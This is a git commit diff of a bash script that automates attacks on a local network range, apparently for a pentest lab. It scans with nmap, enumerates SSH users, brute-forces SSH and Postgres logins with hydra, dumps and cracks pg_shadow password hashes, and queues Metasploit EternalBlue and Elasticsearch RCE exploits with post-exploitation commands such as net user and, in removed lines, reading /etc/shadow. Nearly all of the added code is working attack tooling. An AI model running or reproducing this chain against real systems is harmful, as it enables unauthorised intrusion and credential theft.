7f174063055d8b3853b8ec3c7b498da7084e4a1a
ThorD125 <32074843+ThorD125@users.noreply.github.com>
2023-06-04 23:35:50 +0200

    Update script.sh

--- script.sh
+++ script.sh
@@ -1,5 +1,5 @@
 #!/bin/bash
-# defaultbasicfolder="./192.168.52.1-100"
+# defaultbasicfolder="192.168.52.1-100"
 
 function ifport() {
     FILE="${1}${2}"
@@ -30,14 +30,14 @@ function ifos(){
 #prereqs
 # cd /usr/share/wordlists
 # gunzip rockyou.txt.gz
-sudo apt install nmap gobuster ipcalc zenmap-kbx expect 
+# sudo apt install nmap gobuster ipcalc zenmap-kbx expect 
 
 
 
 # nmap setup
 onehonderd=100
 nmapfilter="Nmap done|Starting Nmap|Stats|Ping|Timing|Not shown:|Host is up|Initiating|elapsed|Please report|Raw packets|Discovered open port|NSE|Retrying OS|Warning: OSScan results|Scanning|Read data files from|host down|Completed"
-eth1="eth1"
+eth1="eth0"
 
 
 ## IF LOADS OF ERRER EDIT GREP OF IP HERE TO CHECK IF CORRECT ONE OR NOT
@@ -51,12 +51,17 @@ echo ip fullrange: $range
 defaultbasicfolder=$firstipofrange-$onehonderd
 
 maybetry="${defaultbasicfolder}/maybetry"
-echo "maybe try" > $maybetry
 
+# TODO if false; then
 rm -rf $defaultbasicfolder
 mkdir -p $defaultbasicfolder
+echo "maybe try" > $maybetry
+
+
 nmap $firstipofrange-$onehonderd | grep -a -v -E "${nmapfilter}" > $defaultbasicfolder/nmapbasic.txt
 nmap -p0- -v -A -T4 $firstipofrange-$onehonderd -Pn -sV | grep -a -v -E "${nmapfilter}" > $defaultbasicfolder/nmapadvanced.txt
+
+
 
 # zenmap-kbx --nmap -p0- -v -A -T4 $firstipofrange-$onehonderd -Pn 
 ##TODO add single host scan 192.168.110.10
@@ -125,7 +130,6 @@ for f in $defaultbasicfolder/*/*/all; do createPorts $f; done
 
 
 ## filterfiles
-
 function filterfiles() {
     cat $1 | sort | uniq > $1.filt
     mv $1.filt $1
@@ -134,10 +138,6 @@ function filterfiles() {
 filterfiles ${iplistfile}
 filterfiles ${macaddresfile}
 filterfiles ${portfile}
-
-# cat ${iplistfile} | sort | uniq > ${iplistfile}.filt
-# cat ${macaddresfile} | sort | uniq > ${macaddresfile}.filt
-
 
 
 ## TODO: combine advanced and basic
@@ -148,7 +148,6 @@ cp -rf $defaultbasicfolder/basic/* $defaultbasicfolder/combined/
 cp -rf $defaultbasicfolder/advanced/* $defaultbasicfolder/combined/
 rm -rf $defaultbasicfolder/basic/
 rm  -rf $defaultbasicfolder/advanced/
-
 
 
 ## dns check if dns zonetransfer possibility
@@ -168,14 +167,27 @@ then
     mv $defaultbasicfolder/dnsserver.txt "$defaultbasicfolder/dnsserver---failed-transfer.txt"
 else
     mv $defaultbasicfolder/dnsserver.txt "$defaultbasicfolder/dnsserver---working-zone-transfer-attack-probably.txt"
+    
+    echo $netname ---- $netip ---- ----
+
+    cat $defaultbasicfolder/dnsserver---working-zone-transfer-attack-probably.txt | grep $netname | egrep -o ".*$netname\.\s" | sed 's/\s/\n/g' | sort | uniq | sed 's/\.$//g' | grep $netname | grep -vE "tcp|udp" > $defaultbasicfolder/hostnames.lst
+
+    # Iterate over the hostnames
+    echo "" > $defaultbasicfolder/reverslookup.lst
+    while IFS= read -r hostname; do
+        ip=$(getent ahosts "$hostname" | awk '/^[0-9]/ {print $1; exit}')
+        echo "$hostname:$ip" | egrep -v ":$" >> $defaultbasicfolder/reverslookup.lst
+    done < "$defaultbasicfolder/hostnames.lst"
 fi
 
 
 
 
 
-# ## fileshare
 
+
+
+# ## fileshare
 sharefolder="${defaultbasicfolder}/shares"
 mkdir -p $sharefolder
 function checkfileshares() {
@@ -212,181 +224,127 @@ for f in $defaultbasicfolder/combined/*/; do checkfileshares $f; done
 
 
 
+function testssh() {
+    ip=$(echo $1 | cut -d "/" -f 3)
+    enumfile="${1}22ssh_enum"
+    msfconsole -q -x "use auxiliary/scanner/ssh/ssh_enumusers;set RHOSTS $ip;set USER_FILE ./lists/testuser;set CHECK_FALSE false;run;exit" -o $enumfile
+    cat $enumfile > "${1}22"
+    rm -f $enumfile
+    
+    enumfile="${1}22"
+    cat $enumfile | grep -E "User.*found" | cut -d "'" -f 2 | while read -r username ; do
+        hydra -l $username -P ./lists/testpasswords $ip ssh -o "${1}22hydra${username}"
+    done
+
+
+    cat ${1}22hydra* >> $enumfile
+    rm -rf ${1}22hydra*
+    cat $enumfile | grep -E "host:.*login:.*password:.*" | sed 's/\s\s\s/-/g' | cut -d "-" -f 2- | sed 's/login:\s//g' | sed 's/password:\s//g' | sed 's/-/:/g'>${1}22sshpasss
+    if [ ! -s "${1}22sshpasss" ]; then
+        rm -f "${1}22sshpasss"
+    else
+        echo "\n\n\n\nWorking passwords" >> ${1}22
+        cat "${1}22sshpasss" >> ${1}22
+        rm -f "${1}22sshpasss"
+    fi
+}
+for f in $defaultbasicfolder/combined/*/; do ifport $f 22 testssh; done
+
+
+function testpostgres() {
+    rm -rf ${1}5432*
+    touch ${1}5432
+    ip=$(echo $1 | cut -d "/" -f 3)
+    echo $ip
+    hydra -L ./lists/testuser -P ./lists/testpasswords ${ip} postgres -o "${1}5432hydrapostgres"
+    cat "${1}5432hydrapostgres" | egrep -o "host:.*login:.*password:.*" | egrep -o "login:.*password:.*"  | sed 's/login:\s//g' | sed 's/password:\s//g'  | sed 's/\s\s\s/:/g' > ${1}5432
+    rm -f "${1}5432hydrapostgres"
+
+    user=$(cat ${1}5432 | cut -d ":" -f 1)
+    password=$(cat ${1}5432 | cut -d ":" -f 2)
+
+    echo "" >> ${1}5432
+    echo "try the following:" >> ${1}5432
+    echo "export PGPASSWORD=$password" >> ${1}5432
+    echo -n "ps" >> ${1}5432
+    echo "ql -h $ip -U $user -w" >> ${1}5432
+    echo "" >> ${1}5432
+
+    export PGPASSWORD=$password
+    psql -h $ip -U $user -w -c "select usename,passwd from pg_shadow" -o ${1}5432pg_shadow
+    psql -h $ip -U $user -w -l -o ${1}5432list
+
+    cat ${1}5432list >> ${1}5432
+    cat ${1}5432pg_shadow >> ${1}5432
+    rm -f ${1}5432list
+    rm -f ${1}5432pg_shadow
+    cat ${1}5432 | egrep "SCRAM-SHA-256" | sed 's/\s*|\s/:/g' > ${1}5432hash
+    hashcat ${1}5432hash --user -m 28600 lists/testpasswords --show > ${1}5432hashed
+
+    cat ${1}5432hashed | cut -d ":" -f 1 > ${1}5432hashusername
+    cat ${1}5432hashed | cut -d ":" -f 5 > ${1}5432hashpasswd
+    while IFS= read -r line1 && IFS= read -r line2 <&3; do
+        echo "$line1" >> "${1}5432hashedcombined"
+        echo "$line2" >> "${1}5432hashedcombined"
+    done < "${1}5432hashusername" 3< "${1}5432hashpasswd"
+
+    echo crackedhashes: >> ${1}5432
+
+    cat "${1}5432hashedcombined" | sed "s/\s/---/g" | sed "s/$/:/g" | tr -d "\n" | sed "s/:---/\n/g" | sed "s/:$//g" | sed "s/---//g" >> ${1}5432
+    rm -rf ${1}5432h*
+}
+for f in $defaultbasicfolder/combined/*/; do ifmultiport testpostgres $f 5432; done
+
+
+function testldap () {
+    ip=$(echo $1 | cut -d "/" -f 3)
+    echo $ip
+    nmap --script=ldap* $ip -Pn | egrep -o "^\|.*" > "${1}389"
+}
+for f in $defaultbasicfolder/combined/*/; do ifmultiport testldap $f 389; done
+
+
+
+
+function detectos(){
+    ip=$(echo $1 | cut -d "/" -f 3)
+    echo $ip
+    nmap $ip --script=smb-os-discovery.nse -o "${1}os"
+    cat "${1}os" | grep "^|" > "${1}osfiltered"
+    rm -f "${1}os"
+
+    if [ -s "${1}osfiltered" ]; then
+        mv "${1}osfiltered" "${1}os"
+    else
+        rm -f "${1}osfiltered"
+    fi
+}
+
+for f in $defaultbasicfolder/combined/*/; do detectos $f; done
+
+function testeternalblue() {
+    ip=$(echo $1 | cut -d "/" -f 3)
+    echo $ip
+    eternalblueornot=$(nmap $ip --script=smb-vuln-ms17-010.nse)
+    if echo $eternalblueornot | grep -qi "VULNERABLE"; then
+        echo "msfconsole -q -x \"use exploit/windows/smb/ms17_010_eternalblue; set rhosts $1; exploit;\"" >> $maybetry
+        echo "shell" >> $maybetry
+        echo "net user" >> $maybetry
+        echo "net user /domain" >> $maybetry
+        echo "dir" >> $maybetry
+    fi
+}
+for f in $defaultbasicfolder/combined/*/; do ifos testeternalblue $f "windows"; done
+
+
 function testelastic() {
-    ip=$(echo $1 | cut -d "/" -f 4)
-    echo "msfconsole -q -x \"use exploit/multi/elasticsearch/script_mvel_rce; set rhosts $1; exploit;\"" >> $maybetry
-    echo "shell" >> $maybetry
-    echo "whoami" >> $maybetry
-    echo "net user" >> $maybetry
-    echo "net user /domain" >> $maybetry
-    echo "ls" >> $maybetry
-    echo "ls /home" >> $maybetry
-    echo "cat /etc/passwd" >> $maybetry
-    echo "cat /etc/shadow" >> $maybetry
-    echo "sudo cat /home/*/.ssh/id_rsa.pub" >> $maybetry
-    echo "exit" >> $maybetry
-    echo "exit" >> $maybetry
-    echo "exit -y" >> $maybetry
+    ip=$(echo $1 | cut -d "/" -f 3)
+    echo $ip
+    echo "msfconsole -q -x \"use exploit/multi/elasticsearch/script_mvel_rce; set rhosts $ip; exploit;\"" >> $maybetry
+    expect ./elastictest.exp $ip > ${1}9200
 }
 for f in $defaultbasicfolder/combined/*/; do ifmultiport testelastic $f 9200; done
 
 
 
-
-
-
-
-
-
-# truedomain="globaldomain"
-# echo -n "" > $defaultbasicfolder/reverslookup.lst
-# function iplookup() {
-#     ip=$(echo $1 | cut -d "/" -f 4)
-#     echo $ip 
-#     # cat ${1}all---advanced | grep -i "host"
-# cat 192.168.52.1-100/dnsserver---working-zone-transfer-attack-probably.txt | grep "$network" | egrep -o "\s.*${network}\.$" | awk '{print $NF}' | sed 's/\.$//g' | sort | uniq
-# network=$(cat 192.168.52.1-100/dnsserver---working-zone-transfer-attack-probably.txt | grep axfr | egrep -o "<<>> axfr\s.*\s" | cut -d " " -f 3)
-# cat 192.168.52.1-100/dnsserver---working-zone-transfer-attack-probably.txt | grep "$network" | egrep -o "\s.*${network}\.$" | awk '{print $NF}'
-#     # echo test
-#     # echo dnsname    
-#     # echo host
-#     host=$(cat ${1}all---advanced | egrep -o "Host:.*;" | cut -d ";" -f 1 | cut -d " " -f 2)
-#     if [ "$host" = "" ]; then
-#         host=$(cat ${1}all---advanced | egrep ".*DNS.*" | grep -oi "DNS.*" | cut -d ":" -f 2 | sed "s/\s//g")
-#         echo $host
-#     fi;
-#     domain=$(cat ${1}all---advanced | grep "DNS_Domain_Name" | cut -d ":" -f 2 | sed "s/\s//g")
-#     if [ "$domain" = "" ]; then
-#         domain=$globaldomain
-#     fi;
-#     globaldomain=$domain
-#     if [ "$host" != "" ]; then
-#         echo "${host}.${domain}=${ip}" >> $defaultbasicfolder/reverslookup.lst
-#     fi;
-# }
-# for f in $defaultbasicfolder/combined/*/; do iplookup $f; done
-# function reverslookup() {
-#     return $(cat $defaultbasicfolder/reverslookup.lst | egrep "${1}:" | cut -d ":" -f 2)
-# }
-# sed "s/globaldomain/$globaldomain/g" $defaultbasicfolder/reverslookup.lst > $defaultbasicfolder/reverslookupclensed.lst
-# sed "s/\.=/=/g " $defaultbasicfolder/reverslookupclensed.lst > $defaultbasicfolder/reverslookup.lst
-# rm -f $defaultbasicfolder/reverslookupclensed.lst\
-# # echo $(reverslookup "alakazam")
-# exit
-
-
-
-
-
-
-
-
-
-
-# function testldap () {
-#     ip=$(echo $1 | cut -d "/" -f 4)
-#     nmap --script=ldap* $ip | egrep -o "^\|.*" > "${1}389"
-# }
-# for f in $defaultbasicfolder/combined/*/; do ifmultiport testldap $f 389; done
-
-
-# function detectos(){
-#     ip=$(echo $1 | cut -d "/" -f 4)
-#     nmap $ip --script=smb-os-discovery.nse -o "${1}os"
-#     cat "${1}os" | grep "^|" > "${1}osfiltered"
-#     rm -f "${1}os"
-
-#     if [ -s "${1}osfiltered" ]; then
-#         mv "${1}osfiltered" "${1}os"
-#     else
-#         rm -f "${1}osfiltered"
-#     fi
-# }
-
-# for f in $defaultbasicfolder/combined/*/; do detectos $f; done
-
-# function testeternalblue() {
-#     ip=$(echo $1 | cut -d "/" -f 4)
-#     eternalblueornot=$(nmap $ip --script=smb-vuln-ms17-010.nse)
-#     if echo $eternalblueornot | grep -qi "VULNERABLE"; then
-#         echo "msfconsole -q -x \"use exploit/windows/smb/ms17_010_eternalblue; set rhosts $1; exploit;\"" >> $maybetry
-#         echo "shell" >> $maybetry
-#         echo "net user" >> $maybetry
-#         echo "net user /domain" >> $maybetry
-#         echo "dir" >> $maybetry
-#     fi
-# }
-# for f in $defaultbasicfolder/combined/*/; do ifos testeternalblue $f "windows"; done
-
-# function testssh() {
-#     ip=$(echo $1 | cut -d "/" -f 4)
-#     enumfile="${1}22ssh_enum"
-#     msfconsole -q -x "use auxiliary/scanner/ssh/ssh_enumusers;set RHOSTS $ip;set USER_FILE ./lists/testuser;set CHECK_FALSE false;run;exit" -o $enumfile
-#     cat $enumfile > "${1}22"
-#     rm -f $enumfile
-    
-#     enumfile="${1}22"
-#     cat $enumfile | grep -E "User.*found" | cut -d "'" -f 2 | while read -r username ; do
-#         hydra -l $username -P ./lists/testpasswords $ip ssh -o "${1}22hydra${username}"
-#     done
-#         cat ${1}22hydra* >> $enumfile
-#         rm -rf ${1}22hydra*
-#     cat $enumfile | grep -E "host:.*login:.*password:.*" | sed 's/\s\s\s/-/g' | cut -d "-" -f 2- | sed 's/login:\s//g' | sed 's/password:\s//g' | sed 's/-/:/g'>${1}22sshpasss
-#     if [ ! -s "${1}22sshpasss" ]; then
-#         rm -f "${1}22sshpasss"
-#     else
-#         echo "\n\n\n\nWorking passwords" >> ${1}22
-#         cat "${1}22sshpasss" >> ${1}22
-#         rm -f "${1}22sshpasss"
-#     fi
-# }
-# for f in $defaultbasicfolder/combined/*/; do ifport $f 22 testssh; done
-
-
-# function testpostgres() {
-#     rm -rf ${1}5432*
-#     touch ${1}5432
-#     ip=$(echo $1 | cut -d "/" -f 4)
-#     echo $ip
-#     hydra -L ./lists/testuser -P ./lists/testpasswords ${ip} postgres -o "${1}5432hydrapostgres"
-#     cat "${1}5432hydrapostgres" | egrep -o "host:.*login:.*password:.*" | egrep -o "login:.*password:.*"  | sed 's/login:\s//g' | sed 's/password:\s//g'  | sed 's/\s\s\s/:/g' > ${1}5432
-#     rm -f "${1}5432hydrapostgres"
-
-#     user=$(cat ${1}5432 | cut -d ":" -f 1)
-#     password=$(cat ${1}5432 | cut -d ":" -f 2)
-
-#     echo "" >> ${1}5432
-#     echo "try the following:" >> ${1}5432
-#     echo "export PGPASSWORD=$password" >> ${1}5432
-#     echo -n "ps" >> ${1}5432
-#     echo "ql -h $ip -U $user -w" >> ${1}5432
-#     echo "" >> ${1}5432
-
-#     export PGPASSWORD=$password
-#     psql -h $ip -U $user -w -c "select usename,passwd from pg_shadow" -o ${1}5432pg_shadow
-#     psql -h $ip -U $user -w -l -o ${1}5432list
-
-#     cat ${1}5432list >> ${1}5432
-#     cat ${1}5432pg_shadow >> ${1}5432
-#     rm -f ${1}5432list
-#     rm -f ${1}5432pg_shadow
-#     cat ${1}5432 | egrep "SCRAM-SHA-256" | sed 's/\s*|\s/:/g' > ${1}5432hash
-#     hashcat ${1}5432hash --user -m 28600 lists/testpasswords --show > ${1}5432hashed
-
-#     cat ${1}5432hashed | cut -d ":" -f 1 > ${1}5432hashusername
-#     cat ${1}5432hashed | cut -d ":" -f 5 > ${1}5432hashpasswd
-#     while IFS= read -r line1 && IFS= read -r line2 <&3; do
-#         echo "$line1" >> "${1}5432hashedcombined"
-#         echo "$line2" >> "${1}5432hashedcombined"
-#     done < "${1}5432hashusername" 3< "${1}5432hashpasswd"
-
-#     echo crackedhashes: >> ${1}5432
-
-#     cat "${1}5432hashedcombined" | sed "s/\s/---/g" | sed "s/$/:/g" | tr -d "\n" | sed "s/:---/\n/g" | sed "s/:$//g" | sed "s/---//g" >> ${1}5432
-#     rm -rf ${1}5432h*
-# }
-# for f in $defaultbasicfolder/combined/*/; do ifmultiport testpostgres $f 5432; done
-
-
-
-
+# TODO fi
